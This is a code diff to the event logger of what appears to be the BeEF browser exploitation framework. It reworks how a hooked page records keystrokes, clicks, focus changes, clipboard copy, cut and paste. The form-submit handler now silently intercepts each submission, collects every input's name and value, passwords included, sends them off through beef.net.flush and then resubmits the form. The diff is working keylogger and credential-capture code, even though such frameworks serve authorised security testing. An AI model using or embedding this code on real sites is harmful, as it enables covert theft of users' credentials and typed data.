@@ -45,6 +45,10 @@ beef.logger = {
         this.data = null;
         this.mods = null;
     },
+    /**
+     * Prevents from recursive event handling on form submission
+     */
+    in_submit: false,
 	
 	/**
 	 * Starts the logger
@@ -55,6 +59,15 @@ beef.logger = {
 		this.running = true;
 		var d = new Date();
 		this.time = d.getTime();
+
+        $j(document).off('keypress');
+        $j(document).off('click');
+        $j(window).off('focus');
+        $j(window).off('blur');
+        $j('form').off('submit');
+        $j(document.body).off('copy');
+        $j(document.body).off('cut');
+        $j(document.body).off('paste');
 
 		$j(document).keypress(
 			function(e) { beef.logger.keypress(e); }
@@ -67,17 +80,19 @@ beef.logger = {
 			function(e) { beef.logger.win_blur(e); }
 		);
 		$j('form').submit(
-			function(e) { beef.logger.submit(e); }
+			function(e) { 
+                beef.logger.submit(e); 
+            }
 		);
-		document.body.oncopy = function() {
+		$j(document.body).on('copy', function() {
 			setTimeout("beef.logger.copy();", 10);
-		};
-		document.body.oncut = function() {
+		});
+		$j(document.body).on('cut', function() {
 			setTimeout("beef.logger.cut();", 10);
-		};
-		document.body.onpaste = function() {
+		});
+		$j(document.body).on('paste', function() {
 			beef.logger.paste();
-		}
+		});
 	},
 	
 	/**
@@ -86,7 +101,14 @@ beef.logger = {
 	stop: function() {
 		this.running = false;
 		clearInterval(this.timer);
-		$j(document).keypress(null);
+        $j(document).off('keypress');
+        $j(document).off('click');
+        $j(window).off('focus');
+        $j(window).off('blur');
+        $j('form').off('submit');
+        $j(document.body).off('copy');
+        $j(document.body).off('cut');
+        $j(document.body).off('paste');
 	},
 
     /**
@@ -181,16 +203,37 @@ beef.logger = {
      * TODO: Cleanup this function
 	 */
 	submit: function(e) {
+        if (beef.logger.in_submit) {
+            return true;
+        }
 		try {
 			var f = new beef.logger.e();
-			var values = "";
 			f.type = 'submit';
 			f.target = beef.logger.get_dom_identifier(e.target);
+            var jqForms = $j(e.target);
+            var values = jqForms.find('input').map(function() { 
+                    var inp = $j(this);    
+                    return inp.attr('name') + '=' + inp.val(); 
+                }).get().join();
+            beef.debug('submitting form inputs: ' + values);
+            /*
 			for (var i = 0; i < e.target.elements.length; i++) {
 	            values += "["+i+"] "+e.target.elements[i].name+"="+e.target.elements[i].value+"\n";
 	        }
-			f.data = 'Action: '+$j(e.target).attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
+            */
+			f.data = 'Action: '+jqForms.attr('action')+' - Method: '+$j(e.target).attr('method') + ' - Values:\n'+values;
 			this.events.push(f);
+            this.queue();
+            this.target = null;
+            beef.net.flush(function done() {
+                beef.debug("Submitting the form");
+                beef.logger.in_submit = true;
+                jqForms.submit();
+                beef.logger.in_submit = false;
+                beef.debug("Done submitting");
+            });
+            e.preventDefault();
+            return false;
 		} catch(e) {}
 	},
 	
